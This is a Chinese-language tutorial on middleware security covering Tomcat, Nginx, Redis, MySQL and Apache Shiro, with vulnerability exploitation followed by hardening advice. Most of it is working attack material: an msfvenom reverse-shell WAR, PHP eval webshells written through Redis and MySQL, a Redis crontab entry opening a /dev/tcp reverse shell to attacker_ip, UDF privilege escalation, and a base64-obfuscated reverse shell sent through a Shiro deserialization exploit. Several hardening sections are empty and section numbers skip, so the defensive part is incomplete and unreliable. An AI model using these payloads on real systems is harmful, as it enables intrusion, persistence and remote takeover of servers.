# 中间件安全

## 一、Tomcat安全

### 1.1 Tomcat简介

Apache Tomcat是Java Servlet和JSP技术的开源实现，是最常用的Java Web应用服务器之一。由于其广泛使用，Tomcat的安全问题备受关注。

### 1.2 常见漏洞

#### 1.2.1 弱口令与Manager后台

```markdown
Tomcat Manager后台弱口令：

默认路径：
- /manager/html
- /manager/status
- /host-manager/html

常见弱口令：
- tomcat:tomcat
- admin:admin
- admin:tomcat
- tomcat:admin
- admin:password

配置文件位置：
- conf/tomcat-users.xml

利用方式：
1. 登录Manager后台
2. 上传WAR包部署
3. 访问部署的WebShell获取权限
```

**WAR包部署利用**

```bash
# 生成WAR包
jar -cvf shell.war shell.jsp

# 或使用msfvenom
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker_ip LPORT=4444 -f war > shell.war

# 上传部署后访问
http://target.com/shell/shell.jsp
```

#### 1.2.2 PUT方法任意文件写入（CVE-2017-12615）

```bash
# 影响版本：Tomcat 7.0.0 - 7.0.79
# 条件：Windows系统，readonly=false

# 利用方式
curl -X PUT "http://target.com/shell.jsp/" -d "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"

# 或使用burp发送PUT请求
PUT /shell.jsp%20HTTP/1.1 HTTP/1.1
Host: target.com
Content-Length: 45

<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

#### 1.2.3 AJP协议文件包含（CVE-2020-1938）

```bash
# 影响版本：Tomcat 6-9全部版本
# 默认端口：8009

# 利用工具
python ajpshark.py target.com 8009 /WEB-INF/web.xml

# 读取任意文件
python CVE-2020-1938.py target.com 8009 /WEB-INF/web.xml

# 可能读取的敏感文件：
- /WEB-INF/web.xml
- /WEB-INF/classes/application.properties
- /WEB-INF/classes/db.properties
```

#### 1.2.4 CGI路径遍历（CVE-2019-0232）

```bash
# 影响版本：Tomcat 9.0.0.M1 - 9.0.17
# 条件：enableCmdLineArguments=true

# 利用方式
http://target.com/cgi-bin/hello.cgi?/bin/cat%20/etc/passwd
```

### 1.3 安全加固

```xml
<!-- conf/tomcat-users.xml 安全配置 -->
<tomcat-users>
  <role rolename="manager-gui"/>
  <user username="admin" password="复杂强密码" roles="manager-gui"/>
</tomcat-users>

<!-- conf/server.xml 安全配置 -->
<Connector port="8080" protocol="HTTP/1.1"
           connectionTimeout="20000"
           redirectPort="8443"
           maxThreads="200"
           minSpareThreads="25"
           acceptCount="100"
           URIEncoding="UTF-8"
           enableLookups="false"
           disableUploadTimeout="true"
           server="WebServer"/>  <!-- 隐藏版本信息 -->

<!-- 禁用AJP协议（如不需要） -->
<!-- <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /> -->

<!-- 错误页面自定义 -->
<Valve className="org.apache.catalina.valves.ErrorReportValve"
       showReport="false"
       showServerInfo="false"/>
```

```bash
# 其他加固措施
1. 删除默认示例应用：examples、docs、ROOT
2. 限制Manager访问IP
3. 使用非root用户运行
4. 定期更新版本
5. 配置日志审计
```

## 二、Nginx安全

### 2.1 Nginx简介

Nginx是一款高性能的HTTP和反向代理服务器，也是一个IMAP/POP3/SMTP代理服务器。由于其高性能和稳定性，被广泛用于Web服务器和反向代理。

### 2.2 常见漏洞

#### 2.2.1 文件解析漏洞

```bash
# Nginx + PHP CGI解析漏洞
# 影响配置：cgi.fix_pathinfo=1

# 利用方式
http://target.com/image.jpg/1.php
http://target.com/image.jpg%00.php

# 图片马利用
1. 上传包含PHP代码的图片
2. 访问图片路径加/.php后缀
3. 服务器将图片作为PHP执行
```

#### 2.2.2 目录遍历

```bash
# 配置不当导致目录遍历
# 错误配置示例：
location / {
    autoindex on;  # 开启目录列表
}

# 利用方式
http://target.com/
http://target.com/backup/
http://target.com/config/
```

#### 2.2.3 CRLF注入

```bash
# 配置不当导致CRLF注入
# 错误配置示例：
location /redirect {
    return 302 $uri;
}

# 利用方式
http://target.com/redirect/%0d%0aSet-Cookie:%20malicious=cookie
http://target.com/redirect/%0d%0a%0d%0a<script>alert(1)</script>
```

#### 2.2.4 路径穿越

```bash
# alias配置不当导致路径穿越
# 错误配置示例：
location /files {
    alias /home/user/files/;  # 注意：location没有以/结尾
}

# 利用方式
http://target.com/files../etc/passwd
http://target.com/files../config/database.yml
```

### 2.3 安全加固

```nginx
# nginx.conf 安全配置示例

# 隐藏版本号
server_tokens off;

# 限制请求方法
if ($request_method !~ ^(GET|HEAD|POST)$ ) {
    return 405;
}

# 限制请求大小
client_max_body_size 10m;
client_body_buffer_size 128k;

# 防止目录遍历
autoindex off;

# 安全头部
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Content-Security-Policy "default-src 'self'" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

# 限制连接数
limit_conn_zone $binary_remote_addr zone=conn_limit:10m;
limit_conn conn_limit 10;

# 限制请求速率
limit_req_zone $binary_remote_addr zone=req_limit:10m rate=10r/s;
limit_req zone=req_limit burst=20 nodelay;

# 禁止访问敏感文件
location ~* \.(git|svn|htaccess|htpasswd|env|config|ini|log|sh|inc|sql)$ {
    deny all;
}

# 禁止访问隐藏文件
location ~ /\. {
    deny all;
}

# 正确的alias配置
location /files/ {
    alias /home/user/files/;
}

# 正确的redirect配置
location /redirect {
    return 302 /new-location;
}
```

## 三、Redis安全

### 3.1 Redis简介

Redis是一个开源的内存数据结构存储系统，可用作数据库、缓存和消息中间件。Redis默认配置存在较多安全问题。

### 3.2 常见漏洞

#### 3.2.1 未授权访问

```bash
# Redis默认配置无密码认证
# 默认端口：6379

# 连接测试
redis-cli -h target_ip -p 6379

# 常见操作
redis-cli -h target_ip info
redis-cli -h target_ip keys *
redis-cli -h target_ip get "password"
```

#### 3.2.2 写入WebShell

```bash
# 条件：知道Web路径且有写权限

redis-cli -h target_ip
config set dir /var/www/html
config set dbfilename shell.php
set x "<?php @eval($_POST['cmd']);?>"
save
```

#### 3.2.3 写入SSH公钥

```bash
# 条件：Redis以root运行，SSH允许密钥登录

redis-cli -h target_ip
config set dir /root/.ssh
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAAB3NzaC1yc2E... attacker@kali\n\n"
save
```

#### 3.2.4 写入Crontab

```bash
# 条件：Redis以root运行

redis-cli -h target_ip
config set dir /var/spool/cron
config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1\n\n"
save
```

#### 3.2.5 主从复制RCE

```bash
# Redis 4.x-5.x 主从复制利用

# 使用rogue-server工具
python rogue-server.py --server-port 6379 --lhost attacker_ip

# 连接目标Redis
redis-cli -h target_ip
slaveof attacker_ip 6379
module load ./exp.so
slaveof no one
```

### 3.3 安全加固


## 四、MySQL安全

### 4.1 MySQL简介

MySQL是最流行的开源关系数据库管理系统，广泛应用于Web应用中。MySQL的安全配置对数据安全至关重要。

### 4.2 常见漏洞

#### 4.2.1 弱口令

```bash
# 常见弱口令
- root:root
- root:123456
- root:password
- admin:admin
- mysql:mysql

# 暴力破解
hydra -l root -P passwords.txt mysql://target_ip
medusa -h target_ip -u root -P passwords.txt -M mysql
```

#### 4.2.2 UDF提权

```sql
-- UDF提权步骤
-- 1. 查看plugin目录
show variables like '%plugin%';

-- 2. 上传恶意UDF库
-- 使用sqlmap或手工上传

-- 3. 创建函数
create function sys_eval returns string soname 'lib_mysqludf_sys.so';

-- 4. 执行命令
select sys_eval('whoami');
select sys_eval('net user hacker password /add');
```

#### 4.2.3 写入WebShell

```sql
-- 条件：知道Web路径且有写权限
-- secure_file_priv需要为空或指定目录

-- 查看secure_file_priv
show variables like 'secure_file_priv';

-- 写入WebShell
select '<?php @eval($_POST[cmd]);?>' into outfile '/var/www/html/shell.php';
select '<?php @eval($_POST[cmd]);?>' into dumpfile '/var/www/html/shell.php';

-- 日志写入方式
set global general_log = on;
set global general_log_file = '/var/www/html/shell.php';
select '<?php @eval($_POST[cmd]);?>';
set global general_log = off;
```

#### 4.2.4 MySQL日志提权

```sql
-- 利用慢查询日志
set global slow_query_log=1;
set global slow_query_log_file='/var/www/html/shell.php';
select '<?php @eval($_POST[cmd]);?>' from sleep(10);
set global slow_query_log=0;
```

### 4.3 安全加固

```sql
-- 删除匿名用户
delete from mysql.user where user='';

-- 删除测试数据库
drop database if exists test;

-- 修改root密码

-- 禁止root远程登录

-- 创建专用应用账户

grant select, insert, update, delete on appdb.* to 'appuser'@'localhost';

-- 限制文件导入导出
-- my.cnf配置
-- secure_file_priv = NULL  -- 禁止导入导出
-- 或指定特定目录
-- secure_file_priv = /var/lib/mysql-files

-- 禁用LOCAL INFILE

```

## 六、Shiro漏洞

### 6.1 Shiro简介

Apache Shiro是一个Java安全框架，提供认证、授权、加密和会话管理功能。Shiro的"记住我"功能使用AES加密，早期版本使用硬编码密钥，导致反序列化漏洞。

### 6.2 Shiro反序列化漏洞

#### 6.2.1 漏洞原理

```markdown
Shiro反序列化漏洞原理：

1. Shiro使用AES加密Cookie中的rememberMe字段
2. 早期版本使用硬编码密钥
3. 攻击者可使用已知密钥解密
4. 构造恶意序列化数据
5. Shiro反序列化时执行恶意代码

影响版本：
- Shiro < 1.2.5：默认硬编码密钥
- Shiro 1.2.5+：需要配置自定义密钥
```

#### 6.2.2 漏洞检测

```bash
# 检测方法
# 1. 查看响应中是否有rememberMe=deleteMe
# 2. 使用工具检测

# 使用ShiroScan
python shiro_scan.py -u http://target.com

# 使用工具检测密钥
java -jar shiro_tool.jar -t http://target.com
```

#### 6.2.3 漏洞利用

```bash
# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections2 "touch /tmp/pwned" > payload.ser

# 使用ShiroAttack工具
java -jar ShiroAttack.jar -t http://target.com -c "touch /tmp/pwned"

# 使用shiro-exploit
python shiro_exploit.py -u http://target.com -c "touch /tmp/pwned"

# 反弹Shell
java -jar ShiroAttack.jar -t http://target.com -c "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlcl9pcC80NDQ0IDA+JjE=}|{base64,-d}|{bash,-i}"
```

#### 6.2.4 常见密钥

```java
// 常见Shiro硬编码密钥

// ... 更多密钥可在工具中找到
```

### 6.3 Shiro-550与Shiro-721

```markdown
Shiro-550：
- CVE-2016-4437
- 使用已知密钥
- 可直接利用

Shiro-721：
- CVE-2019-12422
- 使用未知密钥
- 需要Padding Oracle攻击
- 利用条件：有有效的rememberMe Cookie
```

### 6.4 安全加固

```java

// 2. 配置自定义密钥（确保密钥强度）

// 3. 禁用rememberMe功能（如不需要）
```

## 九、总结

### 9.1 中间件安全要点

```markdown
中间件安全核心要点：

1. 版本管理
   - 及时更新到最新版本
   - 关注安全公告和CVE
   - 应用安全补丁

2. 配置安全
   - 修改默认配置
   - 设置强密码
   - 禁用不必要功能

3. 访问控制
   - 限制管理后台访问
   - 配置IP白名单
   - 使用防火墙规则

4. 权限控制
   - 以低权限用户运行
   - 限制文件读写权限
   - 最小权限原则

5. 监控审计
```
